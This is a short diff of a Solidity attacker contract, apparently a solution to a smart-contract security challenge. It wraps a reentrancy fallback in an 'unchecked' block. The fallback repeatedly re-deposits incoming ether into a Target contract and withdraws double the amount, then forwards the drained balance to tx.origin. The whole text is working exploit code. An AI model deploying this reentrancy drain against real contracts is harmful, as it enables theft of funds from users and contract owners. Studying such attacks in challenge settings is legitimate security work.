@@ -38,14 +38,16 @@ contract OptimizedAttackerSecurity102 {
     }
 
     fallback() external payable {
-        if (msg.value > 8192 ether){
-            payable(tx.origin).transfer(address(this).balance);
-        }else{
-            Target(msg.sender).deposit{ value: msg.value }();
-            if (msg.value * 2 > 8192 ether)
-                Target(msg.sender).withdraw(10001 ether);
-            else
-                Target(msg.sender).withdraw(msg.value * 2);
+        unchecked{
+            if (msg.value > 8192 ether){
+                payable(tx.origin).transfer(address(this).balance);
+            }else{
+                Target(msg.sender).deposit{ value: msg.value }();
+                if (msg.value * 2 > 8192 ether)
+                    Target(msg.sender).withdraw(10001 ether);
+                else
+                    Target(msg.sender).withdraw(msg.value * 2);
+            }
         }
     }
 }
